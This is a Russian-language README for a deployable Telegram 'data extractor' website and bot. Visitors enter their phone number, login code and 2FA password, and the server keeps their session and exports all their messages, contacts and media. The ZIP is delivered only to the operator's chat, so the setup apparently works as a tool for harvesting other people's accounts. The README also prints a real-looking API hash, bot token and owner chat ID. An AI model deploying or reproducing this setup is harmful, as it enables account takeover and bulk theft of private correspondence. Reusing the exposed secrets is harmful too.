# Telegram Data Extractor — Web Edition

Веб-сайт, через который ты логинишься в Telegram и запускаешь полный
экспорт. Готовый ZIP-архив автоматически приходит в личку с ботом
[@cusisnsfvbot](https://t.me/cusisnsfvbot).

## Что умеет

1. Открываешь сайт (URL твоего Render-деплоя)
2. Вводишь номер → получаешь код в Telegram
3. Вводишь код (и пароль 2FA если включён)
4. Жмёшь «Запустить экспорт»
5. Смотришь прогресс (0% → 100%)
6. Архив падает в бота

Формат — Telegram Desktop Export: HTML + JSON + папки photos/, video_files/,
voice_messages/, round_video_messages/, files/, stickers/, animations/.

## Что экспортируется

Структура, совместимая с Telegram Desktop Export:

* Профиль, контакты, список всех диалогов
* История всех сообщений (без лимита либо `limit=N`)
* Фото, видео, голосовые, круглые видеосообщения
* Документы, стикеры, анимации (GIF)
* HTML с интерактивным просмотром (open `index.html`)
* JSON для машинной обработки

## Деплой

* **Render** → см. [DEPLOY.md](DEPLOY.md) ← самое простое, с телефона за 5 минут
* **Railway** → см. ниже

## Как запустить через Railway

### 1. Форкнуть или использовать этот репозиторий

Репо: https://github.com/yagubiskenderov483-code/ddnetcjs

### 2. Деплой на Railway

С телефона в браузере:

1. Открой [railway.com/new](https://railway.com/new)
2. «Deploy from GitHub repo» → выбери `ddnetcjs`
3. Railway сам увидит Dockerfile и развернёт
4. В настройках сервиса → **Variables** добавь (они уже есть в `.env`, но для надёжности):
   * `TG_API_ID` = `39419167`
   * `TG_API_HASH` = `394884a7771a2bb4ebb99bf6b90c1563`
   * `BOT_TOKEN` = `9179638767:AAGdsBI6LVMRcHthWMMWh8MocbuO7ZvA4PU`
   * `OWNER_CHAT_ID` = `8985115640`
5. **Settings → Volumes** → привяжи volume к `/data` (чтобы сессия пережила перезапуск)
6. Deploy. Через 2-3 минуты бот напишет тебе «🟢 Бот запущен».

### 3. Первый логин

В чате с [@cusisnsfvbot](https://t.me/cusisnsfvbot):

```
/login +79991234567
```

Telegram пришлёт код в твой клиент Telegram (в чат «Telegram»).

```
/code 12345
```

Если 2FA — попросит пароль:

```
/pw твой_пароль
```

Готово. Сессия сохранится на сервере (в volume), повторный логин не нужен.

### 4. Экспорт

```
/export
```

Бот напишет прогресс (0% → 100%) и пришлёт ZIP.

## Как запустить локально (если есть комп)

```bash
git clone https://github.com/yagubiskenderov483-code/ddnetcjs.git
cd ddnetcjs
docker compose up --build        # или: pip install -r requirements.txt && python main.py
```

## Безопасность

* Бот отвечает только владельцу (`OWNER_CHAT_ID=8985115640`). Сообщения от других чатов игнорируются.
* Токен бота и api_hash — секреты. **Сделай репо приватным** или **перегенерируй** токен в @BotFather после первого деплоя.
* Пароль 2FA вводится один раз через чат с ботом, нигде не логируется.
* Временные файлы экспорта удаляются после отправки.

## Ограничения

* Секретные (end-to-end) чаты — недоступны ни через MTProto, ни через Telegram Desktop.
* Файлы больше `maxmb` (по умолчанию 50 MB) пропускаются.
* Один экспорт одновременно; второй `/export` ответит «уже идёт».
